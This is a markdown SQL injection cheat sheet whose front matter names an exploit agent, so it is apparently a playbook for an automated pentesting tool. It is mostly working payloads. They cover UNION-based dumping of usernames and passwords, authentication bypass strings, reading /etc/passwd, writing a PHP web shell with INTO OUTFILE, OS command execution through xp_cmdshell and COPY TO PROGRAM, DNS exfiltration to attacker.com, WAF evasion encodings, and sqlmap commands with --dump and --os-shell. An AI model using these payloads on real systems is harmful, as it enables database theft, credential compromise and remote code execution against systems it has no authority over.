---
vuln_type: sqli
severity: critical
cwe: [CWE-89]
owasp: A03:2021-Injection
related_tools: [sqlmap, curl]
exploit_agent: sqli_agent
tags: [sql-injection, union, blind, error-based, time-based, stacked, second-order, waf-bypass]
---

# SQL Injection (SQLi)

## Overview
Occurs when user-controllable input is concatenated or interpolated into SQL queries without proper parameterization. Allows reading, modifying, or deleting database contents, and in some cases achieving OS-level command execution.

---

## Injection Points

| Location | Example | Detection Method |
|----------|---------|-----------------|
| GET parameter | `?id=1` | Append `'` and check for error |
| POST body | `username=admin` | Same, in POST data |
| Cookie | `Cookie: lang=en` | Inject into cookie values |
| HTTP header | `X-Forwarded-For: 1'` | Inject into custom headers |
| JSON body | `{"id": "1"}` | Inject inside JSON string values |
| URL path | `/api/users/1` | Replace path segment |
| Order By / Sort | `?sort=name` | Try `sort=name;--` or `sort=1` |

---

## Detection Techniques

### Step 1: Identify injectable parameters
Submit these one at a time and observe response differences:

```
'
"
;
)
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
1 OR 1=1
' AND '1'='2
```

### Step 2: Confirm injection type

**Error-based** — Application returns database error messages:
```
' → "You have an error in your SQL syntax"
' → "Unclosed quotation mark"
' → "pg_query(): Query failed"
```

**Boolean-based blind** — No errors, but response differs (content length, specific text present/absent):
```
1' AND 1=1-- → normal response
1' AND 1=2-- → different/empty response
```

**Time-based blind** — No visible difference, but response time changes:
```
1' AND SLEEP(5)--         (MySQL)
1'; WAITFOR DELAY '0:0:5' (MSSQL)
1' AND pg_sleep(5)--      (PostgreSQL)
1' AND 1=randomblob(500000000)-- (SQLite)
```

**Union-based** — Merge attacker query with original:
```
1' UNION SELECT null--
1' UNION SELECT null,null--
```

---

## Exploitation Strategies

### 1. Determine Column Count

**ORDER BY method:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here means 2 columns
```

**UNION NULL method:**
```sql
' UNION SELECT null--
' UNION SELECT null,null--       ← success = 2 columns
' UNION SELECT null,null,null--  ← error = not 3
```

### 2. Find Displayable Columns
```sql
' UNION SELECT 'AAAA',null--
' UNION SELECT null,'AAAA'--
```
Whichever position shows "AAAA" in the response is usable for data extraction.

### 3. Extract Database Metadata

**MySQL:**
```sql
' UNION SELECT version(),database()--
' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--
```

**PostgreSQL:**
```sql
' UNION SELECT version(),current_database()--
' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--
```

**MSSQL:**
```sql
' UNION SELECT @@version,null--
' UNION SELECT name,null FROM sysdatabases--
' UNION SELECT name,null FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
```

**SQLite:**
```sql
' UNION SELECT sqlite_version(),null--
' UNION SELECT name,null FROM sqlite_master WHERE type='table'--
' UNION SELECT sql,null FROM sqlite_master WHERE name='users'--
```

### 4. Extract Data
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT GROUP_CONCAT(username,':',password),null FROM users--
```

### 5. Authentication Bypass
```sql
admin'--
admin' OR '1'='1
' OR 1=1--
' OR 1=1#
" OR ""="
admin')--
```

### 6. Read Files (MySQL)
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),null--
```

### 7. Write Files (MySQL, requires FILE privilege)
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',null INTO OUTFILE '/var/www/html/shell.php'--
```

### 8. OS Command Execution

**MySQL (UDF or INTO OUTFILE + web shell):**
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',null INTO OUTFILE '/var/www/html/cmd.php'--
```

**MSSQL (xp_cmdshell):**
```sql
'; EXEC xp_cmdshell 'whoami';--
```

**PostgreSQL (COPY TO):**
```sql
'; COPY (SELECT '') TO PROGRAM 'whoami';--
```

---

## Blind SQLi Data Extraction

### Boolean-based (character by character)
```sql
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
' AND ASCII(SUBSTRING(database(),1,1))>97--
```

### Time-based (character by character)
```sql
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(3),0)--
```

### Out-of-band (DNS exfiltration)
```sql
-- MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--
-- MSSQL
'; EXEC master..xp_dirtree '\\'+db_name()+'.attacker.com\a'--
```

---

## Comment Syntax by DBMS

| DBMS | Line Comment | Block Comment |
|------|-------------|---------------|
| MySQL | `-- ` (space!) or `#` | `/* */` |
| PostgreSQL | `--` | `/* */` |
| MSSQL | `--` | `/* */` |
| Oracle | `--` | `/* */` |
| SQLite | `--` | `/* */` |

**Important:** MySQL requires a space after `--`. Use `#` or `-- -` if unsure.

---

## String Concatenation by DBMS

| DBMS | Syntax |
|------|--------|
| MySQL | `CONCAT('a','b')` or `'a' 'b'` |
| PostgreSQL | `'a'\|\|'b'` |
| MSSQL | `'a'+'b'` |
| Oracle | `'a'\|\|'b'` |
| SQLite | `'a'\|\|'b'` |

---

## WAF / Filter Bypass Techniques

### Keyword blocking
```sql
-- Case variation
UnIoN SeLeCt

-- Inline comments (MySQL)
UN/**/ION SE/**/LECT

-- Double URL encoding
%2527 (for ')
%252f%252a*/UNION%252f%252a*/SELECT

-- Whitespace alternatives
UNION%09SELECT      (tab)
UNION%0ASELECT      (newline)
UNION%0DSELECT      (carriage return)
UNION/**/SELECT     (comment as space)
```

### Quote filtering
```sql
-- Hex encoding (MySQL)
SELECT * FROM users WHERE name=0x61646d696e

-- CHAR() function
SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)
```

### Comma filtering
```sql
-- OFFSET instead of comma in LIMIT
LIMIT 1 OFFSET 1

-- JOIN instead of comma in UNION SELECT
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b

-- SUBSTRING with FROM/FOR
SUBSTRING(database() FROM 1 FOR 1)
```

### Equals sign filtering
```sql
-- LIKE operator
' OR username LIKE 'admin

-- BETWEEN
' OR id BETWEEN 1 AND 1

-- IN()
' OR id IN(1)

-- REGEXP
' OR username REGEXP '^admin'
```

### Space filtering
```sql
-- Parentheses
'OR(1=1)#

-- Comments
'OR/**/1=1#

-- Tab/newline
'OR%091=1#
```

---

## Second-Order SQL Injection
Payload stored in the database, triggered when a different query reads it back:

1. Register username: `admin'--`
2. Application stores it in DB
3. When password change query runs: `UPDATE users SET password='new' WHERE username='admin'--'`
4. The `--` comments out the rest, changing admin's password

---

## sqlmap Automation Tips

```bash
# Basic detection
sqlmap -u "http://target/page?id=1" --batch

# With authentication
sqlmap -u "http://target/page?id=1" --cookie="PHPSESSID=abc;security=low" --batch

# Specific technique
sqlmap -u "http://target/page?id=1" --technique=BU --batch

# Dump specific table
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump --batch

# OS shell (if privileges allow)
sqlmap -u "http://target/page?id=1" --os-shell --batch

# WAF bypass
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch

# Risk/level for thorough testing
sqlmap -u "http://target/page?id=1" --level=5 --risk=3 --batch
```

---

## Output Interpretation

### Confirmed SQLi indicators
- Database error messages in response containing SQL syntax
- Different responses for `AND 1=1` vs `AND 1=2`
- Consistent time delays for time-based payloads
- Union query returning attacker-controlled data in page
- sqlmap output: `[INFO] parameter 'id' is vulnerable`

### False positive indicators
- Generic error pages for all malformed input (not SQL-specific)
- Response differences caused by WAF blocking, not injection
- Time delays caused by network latency, not SLEEP()
- Application reflects input but does not execute it

### Severity assessment
- **Critical**: Can extract data, read files, or execute commands
- **High**: Blind injection confirmed, data extraction possible but slow
- **Medium**: Error-based confirmed but no data extraction achieved yet
- **Low**: Behavioral difference observed but not definitively injection
